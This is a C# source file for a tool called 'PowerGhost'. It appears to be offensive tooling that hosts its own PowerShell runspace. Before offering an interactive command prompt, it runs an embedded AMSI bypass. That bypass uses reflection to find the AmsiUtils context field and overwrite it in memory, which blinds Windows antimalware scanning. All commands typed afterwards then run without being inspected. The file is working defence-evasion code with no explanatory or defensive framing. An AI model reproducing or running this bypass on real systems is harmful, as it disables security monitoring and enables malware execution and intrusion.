using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Threading;
using System.IO;

namespace PowerGhost
{
    class Program
    {
        static void Main(string[] args)
        {
            // this is the AMSI bypass
            string bypass = "$a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like \"*iutils\") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like \"*Context\") {$f = $e}};$g = $f.GetValue($null);[IntPtr]$ptr = $g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);";

            Console.WriteLine("\nPowerGhost by PlackyHacker");
            Console.WriteLine("--------------------------\n");
            Console.WriteLine("Type 'exit' to close.\n");

            // create and open a custom runspace
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            // associate the runspace with a powershell object
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            Console.WriteLine("[+] Executing AMSI bypass...");
            ps.AddScript(bypass);
            ps.Invoke();

            Thread.Sleep(1);

            bool exit = false;
            
            while (exit == false)
            {
                string dir = Directory.GetCurrentDirectory();

                Console.Write("PG " + dir + "> ");
                string input = Console.ReadLine();


                if (input.ToUpper() == "EXIT")
                    exit = true;
                else if(input.ToUpper().StartsWith("CD"))
                {
                    try
                    {
                        Directory.SetCurrentDirectory(input.Split(' ')[1]);
                    }
                    catch (Exception ex){ Console.WriteLine(ex.Message); }
                }
                else if (string.IsNullOrEmpty(input))
                {
                    continue;
                }

                input = input.Trim();
                if (input.EndsWith(";")) input = input.Substring(0, input.Length - 1);

                ps.AddScript(input + " | Out-String");
                System.Collections.ObjectModel.Collection<PSObject> result = ps.Invoke();

                if (result.Count > 0)
                {
                    string str = result[0].BaseObject as string;
                    if (!String.IsNullOrEmpty(str))
                        Console.WriteLine(str.Substring(0, str.Length - 2));
                }
            }

            // close the runspace
            rs.Close();
        }
    }
}
